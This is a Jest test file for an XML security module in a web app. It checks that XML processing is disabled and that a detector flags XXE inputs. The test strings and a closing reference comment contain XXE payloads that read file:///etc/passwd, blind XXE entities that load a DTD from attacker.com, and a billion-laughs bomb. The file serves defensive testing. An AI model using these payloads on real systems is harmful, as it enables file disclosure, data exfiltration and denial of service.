/**
 * XML Security Configuration Tests
 *
 * These tests verify that our XXE prevention measures work correctly.
 * They test against common XXE attack vectors to ensure security.
 *
 * @see /workspace/apps/web/SECURITY-XXE-PREVENTION.md
 *
 * SSD-32 Compliance Tests
 */

import { describe, it, expect } from "@jest/globals";
import {
  validateXmlSize,
  detectXmlThreats,
  XML_SECURITY_POLICY,
  XmlProcessingNotAllowedError,
} from "./xml-security-config";

describe("XML Security Configuration", () => {
  describe("XML_SECURITY_POLICY", () => {
    it("should disable XML processing by default", () => {
      expect(XML_SECURITY_POLICY.allowXmlProcessing).toBe(false);
    });

    it("should enforce security requirements", () => {
      const { securityRequirements } = XML_SECURITY_POLICY;

      expect(securityRequirements.disableExternalEntities).toBe(true);
      expect(securityRequirements.disableDtdLoading).toBe(true);
      expect(securityRequirements.disableDtdValidation).toBe(true);
      expect(securityRequirements.disableDoctype).toBe(true);
      expect(securityRequirements.strictMode).toBe(true);
    });

    it("should enforce reasonable size and depth limits", () => {
      const { securityRequirements } = XML_SECURITY_POLICY;

      expect(securityRequirements.maxXmlSize).toBe(1024 * 1024); // 1MB
      expect(securityRequirements.maxXmlDepth).toBe(10);
    });
  });

  describe("validateXmlSize", () => {
    it("should throw error when XML processing is not allowed", () => {
      const xmlString = '<?xml version="1.0"?><data>test</data>';

      expect(() => validateXmlSize(xmlString)).toThrow(
        XmlProcessingNotAllowedError
      );
    });

    it("should provide clear error message", () => {
      const xmlString = '<?xml version="1.0"?><data>test</data>';

      expect(() => validateXmlSize(xmlString)).toThrow(
        "XML processing is not allowed in this application"
      );
    });
  });

  describe("detectXmlThreats", () => {
    describe("Classic XXE attacks", () => {
      it("should detect DOCTYPE declarations", () => {
        const xmlString = `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("DOCTYPE declaration detected");
        expect(threats).toContain("ENTITY declaration detected");
        expect(threats).toContain("SYSTEM entity reference detected");
        expect(threats).toContain("file:// URL detected");
      });

      it("should detect ENTITY declarations", () => {
        const xmlString = `<!DOCTYPE data [<!ENTITY xxe "malicious">]>`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("ENTITY declaration detected");
      });

      it("should detect SYSTEM references", () => {
        const xmlString = `<!ENTITY xxe SYSTEM "file:///etc/passwd">`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("SYSTEM entity reference detected");
      });
    });

    describe("Parameter entity attacks", () => {
      it("should detect parameter entities", () => {
        const xmlString = `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("Parameter entity reference detected");
        expect(threats).toContain("HTTP(S) URL in entity declaration detected");
      });
    });

    describe("Blind XXE attacks", () => {
      it("should detect blind XXE patterns", () => {
        const xmlString = `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("ENTITY declaration detected");
        expect(threats).toContain("SYSTEM entity reference detected");
        expect(threats).toContain("Parameter entity reference detected");
        expect(threats).toContain("file:// URL detected");
        expect(threats).toContain("HTTP(S) URL in entity declaration detected");
      });
    });

    describe("XML Bomb (Billion Laughs) attacks", () => {
      it("should detect excessive entity references", () => {
        // Create XML with many entity references
        const entityRefs = Array(101)
          .fill("&lol;")
          .join("");
        const xmlString = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
]>
<lolz>${entityRefs}</lolz>`;

        const threats = detectXmlThreats(xmlString);

        expect(
          threats.some((t) => t.includes("Excessive entity references"))
        ).toBe(true);
      });

      it("should allow reasonable number of entity references", () => {
        // Create XML with acceptable number of entity references
        const entityRefs = Array(50)
          .fill("&lol;")
          .join("");
        const xmlString = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
]>
<lolz>${entityRefs}</lolz>`;

        const threats = detectXmlThreats(xmlString);

        expect(
          threats.some((t) => t.includes("Excessive entity references"))
        ).toBe(false);
      });
    });

    describe("External resource loading", () => {
      it("should detect file:// URLs", () => {
        const xmlString = `<!ENTITY xxe SYSTEM "file:///etc/passwd">`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("file:// URL detected");
      });

      it("should detect HTTP URLs in entities", () => {
        const xmlString = `<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("HTTP(S) URL in entity declaration detected");
      });

      it("should detect HTTPS URLs in entities", () => {
        const xmlString = `<!ENTITY xxe SYSTEM "https://attacker.com/evil.xml">`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("HTTP(S) URL in entity declaration detected");
      });

      it("should detect PUBLIC references", () => {
        const xmlString = `<!ENTITY xxe PUBLIC "-//W3C//TEXT copyright//EN" "http://www.w3.org/xmlspec/copyright.xml">`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toContain("PUBLIC entity reference detected");
      });
    });

    describe("Safe XML", () => {
      it("should not detect threats in simple safe XML", () => {
        const xmlString = `<?xml version="1.0"?>
<data>
  <item>test</item>
  <value>123</value>
</data>`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toHaveLength(0);
      });

      it("should not detect threats in XML with attributes", () => {
        const xmlString = `<?xml version="1.0"?>
<data id="123" type="test">
  <item name="example">value</item>
</data>`;

        const threats = detectXmlThreats(xmlString);

        expect(threats).toHaveLength(0);
      });
    });

    describe("Case insensitivity", () => {
      it("should detect DOCTYPE in various cases", () => {
        const variations = [
          "<!DOCTYPE data>",
          "<!doctype data>",
          "<!DoCtYpE data>",
        ];

        variations.forEach((xmlString) => {
          const threats = detectXmlThreats(xmlString);
          expect(threats).toContain("DOCTYPE declaration detected");
        });
      });

      it("should detect ENTITY in various cases", () => {
        const variations = [
          "<!ENTITY xxe>",
          "<!entity xxe>",
          "<!EnTiTy xxe>",
        ];

        variations.forEach((xmlString) => {
          const threats = detectXmlThreats(xmlString);
          expect(threats).toContain("ENTITY declaration detected");
        });
      });
    });
  });

  describe("Security documentation", () => {
    it("should document that XML processing is not allowed", () => {
      // This test verifies that attempting to use XML will fail with a clear message
      const xmlString = '<?xml version="1.0"?><data>test</data>';

      expect(() => validateXmlSize(xmlString)).toThrow();
    });

    it("should guide developers to security documentation", () => {
      try {
        validateXmlSize('<?xml version="1.0"?><data>test</data>');
        // Should not reach here
        expect(true).toBe(false);
      } catch (error) {
        if (error instanceof Error) {
          expect(error.message).toContain("SECURITY-XXE-PREVENTION.md");
        }
      }
    });
  });
});

/**
 * XXE Attack Vector Reference
 *
 * These are the attack vectors we test against:
 *
 * 1. Classic XXE (Local File Disclosure)
 * ```xml
 * <?xml version="1.0"?>
 * <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 * <data>&xxe;</data>
 * ```
 *
 * 2. Parameter Entity XXE
 * ```xml
 * <?xml version="1.0"?>
 * <!DOCTYPE data [
 *   <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
 *   %dtd;
 * ]>
 * <data></data>
 * ```
 *
 * 3. Blind XXE
 * ```xml
 * <?xml version="1.0"?>
 * <!DOCTYPE data [
 *   <!ENTITY % file SYSTEM "file:///etc/passwd">
 *   <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
 *   %dtd;
 * ]>
 * <data></data>
 * ```
 *
 * 4. XML Bomb (Billion Laughs)
 * ```xml
 * <?xml version="1.0"?>
 * <!DOCTYPE lolz [
 *   <!ENTITY lol "lol">
 *   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 *   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 * ]>
 * <lolz>&lol3;</lolz>
 * ```
 *
 * All of these should be detected and blocked by our security measures.
 */
